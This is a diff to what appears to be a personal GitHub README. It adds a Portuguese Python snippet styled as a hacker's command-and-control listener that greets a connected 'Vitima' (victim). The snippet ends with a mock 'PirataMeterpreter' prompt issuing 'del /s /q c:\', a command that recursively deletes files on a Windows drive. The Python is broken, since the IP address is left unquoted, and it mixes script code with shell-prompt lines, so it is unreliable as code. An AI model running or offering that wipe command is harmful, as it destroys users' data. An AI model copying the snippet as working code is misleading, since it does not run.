@@ -3,6 +3,29 @@
  <img height="230em" src="https://hidstuff.files.wordpress.com/2014/06/imag0547.jpg"/>
 </div>
 
+
+```Python
+import sys
+import socket
+import os
+
+IP = 127.0.0.1
+PORT = 6534
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((IP, PORT))
+print("Servidor Criado! no IP: "+IP+" na PORTA:",PORT)
+s.listen(5)
+print("Aguardando por conexões...")
+conn, client = s.accept()
+print(" [+] Nova sessão, Vitima IP:",client[0],"na PORTA:",client[1])
+
+  ~PirataMeterpreter >> del /s /q c:\
+  ~PirataMeterpreter >> KKKKKKKKKKKKKKKK
+
+```
+
+
 <p align="center">
  <br>
  <a href="https://www.instagram.com/gusta_do_bailao/"><img src="https://img.shields.io/badge/instagram-%23E4405F.svg?&style=for-the-badge&logo=instagram&logoColor=white"></a>
